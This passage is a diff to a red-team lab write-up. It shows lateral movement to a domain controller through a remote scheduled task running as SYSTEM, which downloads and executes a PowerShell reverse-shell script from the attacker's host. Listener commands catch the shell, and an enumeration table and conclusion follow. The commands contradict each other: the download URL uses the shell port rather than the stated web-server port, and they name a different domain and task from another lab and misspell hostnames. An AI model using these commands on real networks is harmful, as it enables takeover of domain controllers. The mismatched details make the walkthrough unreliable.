@@ -517,3 +517,65 @@ Great, this is the one I missed - “\\RED_CHILDDC.child.redteam.corp”
 ![Screenshot 2023-07-08 at 10 19 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/d8004b97-4217-4e4b-907e-fc859b9335f6)
 
 Now we are creating a powershell TCP that would connect back to our attacking machine on port 4444.
+
+## Invoke-PowerShellTcpOneLine.ps1
+
+![Screenshot 2023-07-08 at 10 28 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/12f28ff0-e0ab-4c1b-9a4a-f43d395c0952)
+
+With all the information we gathered. From the compromised child-admin system, we schedule a task that will run on the domain controller. This task will initiate a download script of the copy of the Invoke-PowerShellTcpOneLine.ps1 running in our listener at port 80 of our attacking machine. The powershell script will spawn a shell on our attacking machine listening on port 4444.
+
+```bash
+schtasks /create /S RED-CHILDDC.child.redteam.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "silver1" /TR
+"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.250.4:4444/Invoke-PowerShellTcpOneLine.ps1''')'"
+```
+
+The schedule task is successful with task name “silver1”
+
+![Screenshot 2023-07-08 at 10 40 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/c517f50e-50ec-49ec-abb9-be388af02941)
+
+```bash
+#this will transfer the Invoke-PowerShellTcpOneLine.ps1
+sudo python3 -m http.server 80
+
+#this is where the reverse shell will spawn at port 4444
+sudo nc -lnvp 4444
+
+#this will execute the schedule task "recent3"
+schtasks /Run /S windows-sevrer.warfare.corp /TN "silver1"
+```
+
+Listening at port 80 where our Invoke-PowerShellTcpOneLine.ps1 is stored
+
+![Screenshot 2023-07-08 at 10 43 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/75756982-21e2-4031-9fd7-6a4c1941e97a)
+
+Initiating the task from the child-admin machine.
+
+```bash
+schtasks /Run /S RED-CILDDC.child.redteam.corp /TN "silver1"
+```
+
+Task is successful
+
+![Screenshot 2023-07-08 at 10 43 26 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/f0aead82-bd59-4782-97e7-0fe617e1704f)
+
+In our listening port 4444, a shell has been spawned. Do the enumeration and we validated that this spawned shell is the domain controller itself running on IP address 10.10.10.2 with the hostname RED-CHILDDC
+
+![Screenshot 2023-07-08 at 10 44 01 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/bc1e0e2e-201e-4502-955e-b59236b9511e)
+
+Now we completed our enumeration as follows.
+
+| External IP Address | Description |
+| --- | --- |
+| 172.16.25.1 | Out of Scope |
+| 172.16.25.2 | Production-Server |
+| 172.16.25.3 | child.redteam.corp/EMPLOYEE-SYSTEM |
+| Internal IP Address | Description |
+| 10.10.10.1 | Reserved IP of the network |
+| 10.10.10.2 | RED-CHILDDC |
+| 10.10.10.3 | ADMIN-SYSTEM |
+| 10.10.10.4 | DATABASE-SERVER |
+| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |
+
+# Conclusion
+
+The red team engagement has shown that an external attacker can gain an initial foothold to the network by exploiting the public facing server (172.16.25.2). From there an attacker can compromise the entire network.
